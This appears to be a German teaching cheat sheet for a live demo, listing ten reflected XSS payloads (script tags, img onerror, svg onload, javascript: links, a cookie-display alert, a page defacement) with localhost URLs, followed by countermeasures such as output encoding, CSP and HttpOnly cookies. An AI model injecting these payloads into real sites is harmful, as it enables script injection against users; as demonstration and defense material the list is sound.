# XSS Payloads für Live-Demo

## ⚠️ Hinweis
Diese Payloads dienen ausschließlich zu Bildungszwecken und dürfen nur in kontrollierten Testumgebungen verwendet werden.

## Reflected XSS Payloads

### 1. Einfacher Alert-Payload
```
<script>alert('XSS')</script>
```
**URL:** `http://localhost:8000/?search=<script>alert('XSS')</script>`

**Erklärung:** Zeigt eine einfache Alert-Box mit dem Text "XSS"

---

### 2. Cookie-Diebstahl Demonstration
```
<script>alert(document.cookie)</script>
```
**URL:** `http://localhost:8000/?search=<script>alert(document.cookie)</script>`

**Erklärung:** Zeigt alle Cookies der aktuellen Session an

---

### 3. IMG-Tag mit Onerror
```
<img src=x onerror="alert('XSS')">
```
**URL:** `http://localhost:8000/?search=<img src=x onerror="alert('XSS')">`

**Erklärung:** Nutzt das onerror-Event eines Bildes, um JavaScript auszuführen

---

### 4. SVG-basierter XSS
```
<svg onload=alert('XSS')>
```
**URL:** `http://localhost:8000/?search=<svg onload=alert('XSS')>`

**Erklärung:** Verwendet SVG-Tag mit onload-Event

---

### 5. Body-Tag mit Onload
```
<body onload=alert('XSS')>
```
**URL:** `http://localhost:8000/?search=<body onload=alert('XSS')>`

**Erklärung:** Missbraucht das onload-Event des body-Tags

---

### 6. Input-Tag mit Autofocus
```
<input autofocus onfocus=alert('XSS')>
```
**URL:** `http://localhost:8000/?search=<input autofocus onfocus=alert('XSS')>`

**Erklärung:** Nutzt autofocus und onfocus für sofortige Ausführung

---

### 7. Details-Tag
```
<details open ontoggle=alert('XSS')>
```
**URL:** `http://localhost:8000/?search=<details open ontoggle=alert('XSS')>`

**Erklärung:** HTML5 details-Tag mit ontoggle-Event

---

### 8. JavaScript-URL
```
<a href="javascript:alert('XSS')">Click</a>
```
**URL:** `http://localhost:8000/?search=<a href="javascript:alert('XSS')">Click</a>`

**Erklärung:** JavaScript-Protokoll in einem Link

---

### 9. DOM-Manipulation
```
<script>document.body.innerHTML='<h1>Gehackt!</h1>'</script>
```
**URL:** `http://localhost:8000/?search=<script>document.body.innerHTML='<h1>Gehackt!</h1>'</script>`

**Erklärung:** Überschreibt den kompletten Body-Inhalt der Seite

---

### 10. Event-Handler ohne Quotes
```
<img src=x onerror=alert(1)>
```
**URL:** `http://localhost:8000/?search=<img src=x onerror=alert(1)>`

**Erklärung:** Funktioniert auch ohne Anführungszeichen

---

## Gegenmaßnahmen

### Input-Validierung
Benutzereingaben sollten serverseitig validiert und gefiltert werden.

### Output-Encoding
Alle Benutzereingaben müssen vor der Ausgabe HTML-encoded werden:
- `<` wird zu `&lt;`
- `>` wird zu `&gt;`
- `"` wird zu `&quot;`
- `'` wird zu `&#x27;`

### Content Security Policy (CSP)
CSP-Header verhindert die Ausführung von Inline-JavaScript.

### HTTPOnly Cookie-Flag
Cookies mit HTTPOnly-Flag können nicht via JavaScript ausgelesen werden.
